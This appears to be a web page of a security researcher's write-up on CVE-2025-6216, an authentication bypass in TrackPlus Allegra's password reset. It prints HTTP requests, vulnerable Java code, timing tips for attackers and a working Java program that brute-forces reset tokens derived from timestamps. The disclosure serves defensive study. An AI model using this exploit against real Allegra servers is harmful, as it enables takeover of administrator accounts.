<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CVE-2025-6216: Authentication Bypass In TrackPlus Allegra | zdaylabs</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
      color: #dcdcdc;
      line-height: 1.6;
      padding: 0 2rem;
      min-height: 100vh;
    }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 2rem 0 1rem;
      border-bottom: 1px solid #333;
    }
    
    .logo {
      font-size: 1.5rem;
      font-weight: bold;
      color: #ffffff;
    }
    
    nav a {
      margin: 0 1rem;
      text-decoration: none;
      color: #ccc;
      font-size: 0.95rem;
    }
    
    nav a:hover {
      color: #fef200;
    }
    
    .socials a {
      margin-left: 1rem;
      color: #999;
      font-size: 1.2rem;
      text-decoration: none;
    }
    
    main {
      max-width: 1000px;
      margin: 2rem auto;
      padding: 0 1rem;
    }
    
    h1 {
      font-size: 2.5rem;
      color: #fff;
      margin-bottom: 1rem;
    }
    
    h2 {
      color: #fef200;
      font-size: 1.8rem;
      margin: 2rem 0 1rem;
      border-bottom: 2px solid #333;
      padding-bottom: 0.5rem;
      text-align: left;
    }
    
    h3 {
      color: #fef200;
      font-size: 1.4rem;
      margin: 1.5rem 0 0.8rem;
    }
    
    p {
      margin-bottom: 1.2rem;
      color: #bbb;
    }
    
    code {
      color: #36d1dc;
      font-family: 'Courier New', monospace;
    }
    
    pre {
      background-color: #1e2329;
      border: 1px solid #333;
      border-radius: 4px;
      padding: 1rem;
      overflow-x: auto;
      margin: 1rem 0;
    }
    
    img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      margin: 1rem 0;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    video {
      display: block;
      width: 100%;
      height: auto;
      border-radius: 8px;
      margin: 1rem 0;
      background: #000;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    ul {
      color: #bbb;
      margin-left: 1.5rem;
    }
    
    li {
      margin-bottom: 0.5rem;
    }
    
    a {
      color: #36d1dc;
      text-decoration: none;
    }
    
    a:hover {
      color: #fef200;
      text-decoration: underline;
    }
    
    .highlight {
      background: rgba(254, 242, 0, 0.1);
      color: #fef200;
      padding: 0.1rem 0.3rem;
      border-radius: 3px;
    }
    
    .cve-info {
      background: rgba(54, 209, 220, 0.1);
      border: 1px solid #36d1dc;
      border-radius: 8px;
      padding: 1.5rem;
      margin: 2rem 0;
    }
    
    .cve-info h3 {
      margin-top: 0;
      color: #36d1dc;
    }
    
    .severity {
      display: inline-block;
      padding: 0.3rem 0.8rem;
      border-radius: 4px;
      font-weight: bold;
      font-size: 0.9rem;
    }
    
    .severity.high {
      background: rgba(255, 69, 58, 0.2);
      color: #ff453a;
      border: 1px solid #ff453a;
    }
    
    footer {
      text-align: center;
      padding: 2rem 0;
      border-top: 1px solid #333;
      margin-top: 3rem;
      color: #999;
    }
    
    .social-links {
      margin-top: 1rem;
    }
    
    .social-links a {
      margin: 0 1rem;
      color: #36d1dc;
    }
  </style>
</head>
<body>
  <div id="navigation-placeholder"></div>
  <script src="navigation.js"></script>

  <main>
    <h1>CVE-2025-6216: Authentication Bypass In TrackPlus Allegra</h1>
    
    <div class="cve-info">
      <h3>CVE Information</h3>
      <p><strong>CVE ID:</strong> CVE-2025-6216</p>
      <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
      <p><strong>CVSS Score:</strong> 9.8</p>
      <p><strong>Affected Product:</strong> TrackPlus Allegra</p>
      <p><strong>Vulnerability Type:</strong> Authentication Bypass</p>
      <p><strong>Discovery Date:</strong> June 2025</p>
    </div>

    <h2>Executive Summary</h2>
    <p>
      A critical authentication bypass vulnerability has been discovered in TrackPlus Allegra  8.1.3, allowing unauthenticated attackers to gain administrative access to the application.
    </p>

    <h2>Technical Details</h2>
<p>
      The specific flaw exists within the password recovery mechanism. The issue results from reliance upon a predictable value when generating a password reset token. An attacker can leverage this vulnerability to bypass authentication on the application
          </p>

    <h3>Vulnerability Analysis</h3>
    <p>
      The application uses a mixture of struts2 and Jakarta as Framework for the entire webapp.
      The REST apis are primarily written in Jakarta.

      So if you want to find the source code of an endpoint you can search something like:
      <pre>
        <code>
          @POST("/login")
        </code>
      </pre>
      However , the requests originatig from the UI doesn't target the REST apis , matter of fact the REST apis are not even enabled by default.
    </p>
<p>
  Upon filling out the Login form we see the below request.
</p>
<p>
  <pre>
    <code>
POST /demo/logon!beforeLogin.action HTTP/1.1
Host: 192.168.30.135:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 139
Origin: http://192.168.30.135:8082
Connection: keep-alive
Referer: http://192.168.30.135:8082/demo/logoff.action?logOff=true&dc=1755430588839
Cookie: JSESSIONID=03DF3A328A62E93CF33A06F9B6FB7227
Priority: u=0

username=admin&password=000400010008000c000b&nonce=e4e75183e231444c8af0b6dc7f70ba4d&fromAjax=true&_dc=1755431276521&appType=&appActionName=
    </code>
  </pre>
</p>
<p>
  Similarly when we trigger the forget Password we see the below Request.
</p>
<p>
  <pre>
    <code>
POST /demo/resetPassword.action HTTP/1.1
Host: 192.168.30.135:8082
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 78
Origin: http://192.168.30.135:8082
Connection: keep-alive
Referer: http://192.168.30.135:8082/demo/logoff.action?logOff=true&dc=1755430588839
Cookie: JSESSIONID=03DF3A328A62E93CF33A06F9B6FB7227

email=admin%40test.com&fromAjax=true&_dc=1755431380425&appType=&appActionName=
    </code>
  </pre>
</p>
<p>
  Checking the struts-track.xml we can see that the resetPassword action is mapped to com.aurel.track.user.ResetPasswordAction class
</p>
<p>
    <pre>
      <code>
        &lt;action name=&quot;resetPassword&quot; class=&quot;com.aurel.track.user.ResetPasswordAction&quot;&gt;
        &lt;result name=&quot;failure&quot; type=&quot;redirectAction&quot;&gt;logoff&lt;/result&gt;
        &lt;result name=&quot;resetPassword&quot;&gt;/pages/application/borderLayout.jsp&lt;/result&gt;
        &lt;result name=&quot;expired&quot;&gt;/pages/application/borderLayout.jsp&lt;/result&gt;
        &lt;interceptor-ref name=&quot;defaultNoAuth&quot; /&gt;
        &lt;/action&gt;
      </code>
    </pre>

  </p>
  <p>Below is the ResetPasswordAction.class execute() method definition</p>
  <p>
    <pre>
      <code>
        public String execute() {
          Locale locale = this.servletRequest.getLocale();
          ArrayList<LabelValueBean> errors = new ArrayList<LabelValueBean>();
          String serverUrl = ApplicationBean.getInstance().getServerAbsUrl();
          boolean emailSent = ProfileBL.resetPassword(this.email, serverUrl, true, errors, locale);
          if (errors.isEmpty()) {
              StringBuilder sb = new StringBuilder();
              sb.append("{");
              JSONUtility.appendBooleanValue(sb, "success", true);
              sb.append("\"data\":{");
              JSONUtility.appendBooleanValue(sb, "emailSent", emailSent, true);
              sb.append("}");
              sb.append("}");
              JSONUtility.encodeJSON(ServletActionContext.getResponse(), sb.toString());
          } else {
              JSONUtility.encodeJSONErrorsExtJS(ServletActionContext.getResponse(), errors);
          }
          return null;
      }
  
      </code>
    </pre>
  </p>

  <p>
    The way struts action works , is the action class will implement an execte() method and whenever this class is triggered this function gets triggered.
  </p>
  <p>Checking the above exeute method we can see that the profileBL.resetPassword() method is called.</p>
  <p><pre>
    <code>
      public static boolean resetPassword(String email, String serverURL, boolean automaticLoginAfterReset, List<LabelValueBean> errors, Locale locale) {
        ApplicationBean appBean = ApplicationBean.getInstance();
        if (appBean == null) {
            LOGGER.error("No ApplicationBean found, this should never happen");
            return false;
        }
        boolean haveErrors = false;
        boolean emailSent = false;
        StringBuilder errorsMessage = new StringBuilder();
        try {
            List<TPersonBean> personList = PersonBL.loadByEmail(email);
            List<TPersonBean> loginnameArray = new ArrayList<>(5);
            if (personList != null) {
                LOGGER.debug("Now looping through responses...");
                for (TPersonBean person : personList) {
                    LOGGER.debug("Could retrieve person with login name {}", person.getLoginName());
                    loginnameArray.add(person);
                    Date texpDate = PersonBL.calculateTokenExpDate((Date) null);
                    person.setTokenExpDate(texpDate);
                    String tokenPasswd = DigestUtils.sha256Hex(Long.toString(texpDate.getTime()));
                    person.setForgotPasswordKey(tokenPasswd);
                    person.setLastEdit(new Date());
                    if (!GeneralSettings.isDemoSite() || person.getIsSysAdmin()) {
                        PersonBL.saveSimple(person);
                    }
                }
            }
            if (loginnameArray.isEmpty()) {
                haveErrors = true;
                errorsMessage.append(getText("logon.newpassword.error.email.missing", locale) + "\n");
            }
            if (!loginnameArray.isEmpty() && !haveErrors) {
                try {
                    emailSent = sendResetPassword(loginnameArray, email, serverURL, automaticLoginAfterReset);
                } catch (Exception e) {
                    LOGGER.error(ExceptionUtils.getStackTrace(e));
                    errorsMessage.append(getText("logon.newpassword.error.email.sendFailed", locale) + "\n");
                    haveErrors = true;
                }
            }
        } catch (Exception e2) {
            LOGGER.debug(e2.getMessage(), e2);
            LOGGER.error("Cannot mail new password.");
            errorsMessage.append(getText("logon.err.noDataBase", locale) + "\n");
            haveErrors = true;
        }
        if (haveErrors) {
            errors.add(new LabelValueBean(errorsMessage.toString(), "email"));
        }
        return emailSent;
    }
    </code>
  </pre></p>
  <p>Above code block is the resetPassword() method of the ProfileBL class.</p>
    <p>On above <code>PersonBL.calculateTokenExpDate((Date) null);</code> calculates  the expiry date of the token, then <code>DigestUtils.sha256Hex(Long.toString(texpDate.getTime()));</code>
    encrypts the token with sha256 hash and stores it in the Person Object</p>
    <p>Later this token gets sent to the user via email.</p>

    <p>So far so good.</p>
    <p>
      However the problem lies in the calculateTokenExpDate().
      If you check the whole code , there has to some place where the secret token must be getting generated.
      calculateTokenExpDate() is the function where the token gets generated and an expiry date gets set.
      Below is how the calculateTokenExpDate() function looks like</p>

      <p>
        <pre>
          <code>
            public static Date calculateTokenExpDate(Date personCreatedDate) {
              long tokenExpInMillis = 28800000L;
              if (personCreatedDate != null) {
                  return new Date(personCreatedDate.getTime() + tokenExpInMillis);
              }
              return new Date(new Date().getTime() + tokenExpInMillis);
          }
          </code>
        </pre>
      </p>
<p>
  It uses java's date() functionto generate the secret token and add an expiry on it.
  This functiondoesn't generates cryptographic secure token and thus can be bruteforced with linear time .
  Couple of things that attackers has to keep in mind while exploting this kind of flaw is 
  1.The Timezone difference
  2.The time difference(Even difference in few seconds may disrtup the attack)

  Best way is to take a server in the same time zone and use a curl command that gets the server clock time and then sycn your attacker's server clock to the same.
</p>
    <h2>Proof of Concept</h2>
    <p>
      The following demonstrates how an attacker can bypass authentication:
    </p>

    <P>
      We can write a small java programme that is going to brute force the token and print it out.
    </P>
    <P>
      Token Brute Forcer
      <pre>
        <code>
          import java.util.*;
          import org.apache.commons.codec.digest.DigestUtils;
          
          public class TokenHashBruteForce {
          
              public static void main(String[] args) {
                  // Current time
                  long now = System.currentTimeMillis();
                  
                  // 5 seconds back, 2 seconds forward
                  long start = now - (5 * 1000); // 5 seconds
                  long end = now + (2 * 1000);   // 2 seconds
          
                  // 8 hours in milliseconds
                  long eightHoursMillis = 28800000L;
          
                  List<String> hashes = new ArrayList<>();
          
                  for (long time = start; time <= end; time++) {
                      long expirationTime = time + eightHoursMillis;
                      String hash = DigestUtils.sha256Hex(Long.toString(expirationTime));
                      hashes.add(hash);
                  }
          
                  // Output all hashes
                  for (String h : hashes) {
                      System.out.println(h);
                  }
          
                  System.out.println("\nTotal Hashes generated: " + hashes.size());
              }
          }
          
        </code>
      </pre>
    </P>
<p>
  Combined with a python3 script to automate the forget password request we can attain complete auth Bypass.
  <video controls preload="metadata">
    <source src="videos/allegra_auth_bypass.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  
</p>
    <h2>Affected Versions</h2>
    <p>
      This vulnerability affects TrackPlus Allegra versions â‰¤ 8.1.3.32. Organizations using affected versions should immediately apply security patches.
    </p>

    <h2>Timeline</h2>
    <ul>
      <li><strong>Discovery:</strong> June 2025</li>
      <li><strong>Vendor Notification:</strong> June 2025</li>
      <li><strong>CVE Assignment:</strong> June 2025</li>
    </ul>

    <h2>References</h2>
    <ul>
      <li><a href="https://alltena.com/en/resources/release-notes/release-notes-for-release-8-1-4-and-release-7-5-2">TrackPlus Security Advisory</a></li>
      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6216">National Vulnerability Database</a></li>
      <li><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-410/">ZDI Advisory</a></li>
    </ul>

    <p><em>This research was conducted by the ZDaylabs security team as part of our ongoing commitment to improving application security.</em></p>
  </main>
</body>
</html>
